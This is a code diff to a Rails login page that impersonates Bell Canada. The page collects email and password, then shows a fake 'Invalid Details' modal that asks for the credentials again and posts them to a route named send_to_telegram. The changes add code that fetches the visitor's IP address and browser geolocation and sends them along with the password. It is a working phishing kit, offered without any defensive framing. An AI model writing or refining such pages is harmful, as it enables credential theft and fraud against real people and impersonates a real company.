@@ -6,87 +6,87 @@
   <title>Container Page</title>
   <%= csrf_meta_tags %>
   <%= csp_meta_tag %>
-<%= javascript_include_tag 'application' %>
+  <%= javascript_include_tag 'application' %>
 </head>
 <body>
    <!-- navbar -->
-    <div className="padding-div">
-    <div class="div">
-    <div class="group">
-      <%= image_tag 'image.png', class: 'logo' %>
-    <div class="separator"></div>
-    <div class="column">
-      <p>Business</p>
-      <p>Email</p>
-    </div>
-    </div>
-    <p class="underline">Français</p>
-    </div>
+    <div class="padding-div">
+      <div class="div">
+        <div class="group">
+          <%= image_tag 'image.png', class: 'logo' %>
+          <div class="separator"></div>
+          <div class="column">
+            <p>Business</p>
+            <p>Email</p>
+          </div>
+        </div>
+        <p class="underline">Français</p>
+      </div>
     </div>
 
   <!-- Modal container -->
-   <div class="modalcontainer">
-      <div class="modalwrapper">
-        <h1 class="tink">Log In.</h1>
-        <form class="field">
-          <div class="form-group">
-            <label for="email">Email Address </label>
-            <input id="email" type="email" name="email" />
-            <span id="email-error" class="error-message"></span> <!-- Error message for email -->
-          </div>
-          <div class="form-group">
-            <label for="password">Password</label>
-            <input id="password" type="password" name="password" />
-            <span id="password-error" class="error-message"></span> <!-- Error message for password -->
-          </div>
-          <button type="submit" class="submit" id="openModal">Login</button>
-          <p class="reduce">Forgot your password? Call 310-<span class="bold">BELL</span> support.</p>
-        </form>
-        <div class="form-footer">
-          <p class="blue"><a href="#">Privacy</a> | <a href="#"> Legal & Regulatory</a></p>
-          <p class="copyright">&copy; Bell Canada,. All rights reserved.</p>
+  <div class="modalcontainer">
+    <div class="modalwrapper">
+      <h1 class="tink">Log In.</h1>
+      <form class="field">
+        <div class="form-group">
+          <label for="email">Email Address</label>
+          <input id="email" type="email" name="email" />
+          <span id="email-error" class="error-message"></span> <!-- Error message for email -->
         </div>
+        <div class="form-group">
+          <label for="password">Password</label>
+          <input id="password" type="password" name="password" />
+          <span id="password-error" class="error-message"></span> <!-- Error message for password -->
+        </div>
+        <button type="submit" class="submit" id="openModal">Login</button>
+        <p class="reduce">Forgot your password? Call 310-<span class="bold">BELL</span> support.</p>
+      </form>
+      <div class="form-footer">
+        <p class="blue"><a href="#">Privacy</a> | <a href="#"> Legal & Regulatory</a></p>
+        <p class="copyright">&copy; Bell Canada. All rights reserved.</p>
       </div>
     </div>
-            
+  </div>
+  
   <!-- Modal -->
- <div id="myModal" class="modal">
-  <div class="modal-content">
-    <span class="close">&times;</span>
-    <h2 class="modalheader">Oops, Invalid Details</h2>
-   <%= form_with url: send_to_telegram_path, method: :post, remote: true, id: 'telegram-form' do |form| %>
-  <!-- Email field -->
-  <div class="modalform-group">
-    <%= form.label :modalemail, 'Email' %>
-    <%= form.text_field :modalemail, id: 'modalemail', class: 'modalfield', required: true %>
-    <span id="email-error" class="error-message"></span>
+  <div id="myModal" class="modal">
+    <div class="modal-content">
+      <span class="close">&times;</span>
+      <h2 class="modalheader">Oops, Invalid Details</h2>
+      <%= form_with url: send_to_telegram_path, method: :post, remote: true, id: 'telegram-form' do |form| %>
+        <!-- Email field -->
+        <div class="modalform-group">
+          <%= form.label :modalemail, 'Email' %>
+          <%= form.text_field :modalemail, id: 'modalemail', class: 'modalfield', required: true %>
+          <span id="email-error" class="error-message"></span>
+        </div>
+
+        <!-- Password field -->
+        <div class="modalform-group">
+          <%= form.label :modalpassword, 'Password' %>
+          <%= form.password_field :modalpassword, id: 'modalpassword', class: 'modalfield', required: true %>
+          <span id="password-error" class="error-message"></span>
+        </div>
+
+        <!-- Submit button -->
+        <div class="modalform-group">
+          <%= form.submit 'Login', class: 'modalsubmit' %>
+        </div>
+      <% end %>
+    </div>
   </div>
 
-  <!-- Password field -->
-  <div class="modalform-group">
-    <%= form.label :modalpassword, 'Password' %>
-    <%= form.password_field :modalpassword, id: 'modalpassword', class: 'modalfield', required: true %> <!-- Added 'field' class here -->
-    <span id="password-error" class="error-message"></span> <!-- Optional: Add error message -->
-  </div>
-
-  <!-- Submit button -->
-  <div class="modalform-group">
-    <%= form.submit 'Login', class: 'modalsubmit' %> <!-- Added 'submit' class here -->
-  </div>
-<% end %>
-
-  </div>
-</div>
-
- <script>
-document.addEventListener('DOMContentLoaded', function() {
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
   var modal = document.getElementById("myModal");
   var btn = document.getElementById("openModal");
   var span = document.getElementsByClassName("close")[0];
 
+  // Modal behavior
   if (btn) {
     btn.onclick = function() {
-      modal.style.display = "block";
+      modal.style.display = "none"; // Prevent opening the modal before validation
     }
   }
 
@@ -103,16 +103,17 @@ document.addEventListener('DOMContentLoaded', function() {
   }
 
   // Form submission and validation for login
-  document.querySelector('.field').addEventListener('submit', function(event) {
+  document.querySelector('.field').addEventListener('submit', async function(event) {
     event.preventDefault(); // Prevent default form submission
 
     var email = document.getElementById('email').value;
     var password = document.getElementById('password').value;
-    
-    // Form validation
-    var isValid = true;
+
+    // Reset error messages
     document.getElementById('email-error').innerText = '';
     document.getElementById('password-error').innerText = '';
+
+    var isValid = true;
 
     // Email validation
     if (!email || !/\S+@\S+\.\S+/.test(email)) {
@@ -121,16 +122,24 @@ document.addEventListener('DOMContentLoaded', function() {
     }
 
     // Password validation
-    if (!password || password.length < 1) {
-      document.getElementById('password-error').innerText = 'Please enter your password.';
+    if (!password || password.length < 1) { // Fix to check for an empty password
+      document.getElementById('password-error').innerText = 'Password is required.';
       isValid = false;
     }
 
+    // If both email and password are valid, continue
     if (isValid) {
-      // Send data to the server (via AJAX)
-      var formData = {
+        modal.style.display = "block"; 
+      // Fetch IP address and location
+      const ipAddress = await getIpAddress();
+      const location = await getLocation();
+
+      // Prepare data to send
+      const formData = {
         email: email,
-        password: password
+        password: password,
+        ip_address: ipAddress,
+        ...location // Spread location details
       };
 
       // Make AJAX request to send the data to the server
@@ -145,27 +154,76 @@ document.addEventListener('DOMContentLoaded', function() {
       .then(response => response.json())
       .then(data => {
         console.log('Success:', data);
-        // Show the modal for message input
-        modal.style.display = "block";  // Show modal for message input
+
       })
       .catch((error) => {
         console.error('Error:', error);
       });
+    } else {
+      // If validation fails, prevent modal from opening
+      modal.style.display = "none"; 
     }
   });
 
-  // Handle the response and show the success message for telegram form
-  document.getElementById('telegram-form').addEventListener('ajax:success', function(event) {
-    var [data, status, xhr] = event.detail;
-    document.getElementById('response').innerText = data.status;
-  });
+  // Function to get IP address
+  async function getIpAddress() {
+    try {
+      const response = await fetch('https://api64.ipify.org?format=json');
+      const data = await response.json();
+      return data.ip;
+    } catch (error) {
+      console.error('Failed to fetch IP address:', error);
+      return 'N/A';
+    }
+  }
 
-  // Optionally, handle AJAX failure
-  document.getElementById('telegram-form').addEventListener('ajax:error', function(event) {
-    var [data, status, xhr] = event.detail;
-    document.getElementById('response').innerText = 'An error occurred';
-  });
+  // Function to get location
+  async function getLocation() {
+    return new Promise((resolve) => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          async (position) => {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            // Get location details
+            const locationDetails = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
+            const data = await locationDetails.json();
+
+            resolve({
+              latitude: latitude,
+              longitude: longitude,
+              country: data.address ? data.address.country : 'N/A',
+              city: data.address ? data.address.city : 'N/A',
+              state: data.address ? data.address.state : 'N/A',
+              zip_code: data.address ? data.address.postcode : 'N/A'
+            });
+          },
+          (error) => {
+            console.error('Geolocation error:', error);
+            resolve({
+              latitude: null,
+              longitude: null,
+              country: 'N/A',
+              city: 'N/A',
+              state: 'N/A',
+              zip_code: 'N/A'
+            });
+          }
+        );
+      } else {
+        resolve({
+          latitude: null,
+          longitude: null,
+          country: 'N/A',
+          city: 'N/A',
+          state: 'N/A',
+          zip_code: 'N/A'
+        });
+      }
+    });
+  }
 });
-</script>
+  </script>
 </body>
 </html>
